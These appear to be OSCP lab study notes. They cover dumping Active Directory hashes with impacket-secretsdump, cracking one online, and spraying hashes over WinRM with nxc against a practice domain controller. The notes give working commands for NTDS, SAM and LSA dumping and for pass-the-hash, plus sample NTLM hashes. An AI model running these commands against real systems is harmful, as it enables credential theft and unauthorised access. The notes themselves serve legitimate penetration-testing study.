
```
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL > hash.txt
```

Filter the hashes 
```
cat hash.txt|cut -d : -f 4
```

https://crackstation.net/

Grep the cracked hash to find out which user the password belongs to
```
grep -r '12579b1666d4ac10f0f59f300776495f' hash.txt
```

---

Also keep in mind, we may be able to use any of these hashes to get access to the box, so long as, they are a valid user _and_ that user is part of the Remote Management group. Let’s check by adding all the names to a file called names.txt and changing the contents of our hashes file to contain _only_ hashes. Then we will use both names.txt and our revised hashes file with crackmapexec.

![[Pasted image 20260820224339.png]]

![[Pasted image 20260820224345.png]]
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `nxc winrm ${ip} -u names.txt -H hashes`;

dv.paragraph("```bash\n" + command + "\n```");
```
```powershell
WINRM       192.168.242.175 5985   RESOURCEDC       [+] resourced.local\L.Livingstone:19a3a7550ce8c505c2d46b5e39d6f808 (Pwn3d!)
```

(Pwn3d!) means admin access

---
### 1. Offline Parsing (Your Current Case)

Used when you exfiltrate credential databases or registry backups from a target:

- **Domain Hashes:** Requires `ntds.dit` + `SYSTEM` registry hive.
    
- **Local SAM Hashes:** Requires `SAM` + `SYSTEM` registry hives.
    
    Bash
    
    ```
    impacket-secretsdump -sam SAM -system SYSTEM LOCAL
    ```
    
- **LSA Secrets / Cached Credentials:** Requires `SECURITY` + `SYSTEM` registry hives.
    
    Bash
    
    ```
    impacket-secretsdump -security SECURITY -system SYSTEM LOCAL
    ```
    

### 2. Live Network Dump (Remote Administrative Access)

If you gain local administrator privileges on a host (or Domain Admin on a DC), you don't need to manually extract files. You can run `secretsdump` remotely over the network using valid credentials, Kerberos tickets, or NTLM hashes:

- **Dump Domain Hashes from a Domain Controller (DRSUAPI / Volume Shadow Copy):**
    
    Bash
    
    ```
    impacket-secretsdump domain.local/Administrator:'Password123'@192.168.242.175
    ```
    
- **Pass-the-Hash (PtH) against a target:**
    
    Bash
    
    ```
    impacket-secretsdump -hashes :aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 domain.local/Administrator@192.168.242.175
    ```
    

In short, `LOCAL` mode is for parsing exfiltrated backup files offline, while supplying network targets (`@IP`) dumps credentials live from active Windows machines over SMB/RPC.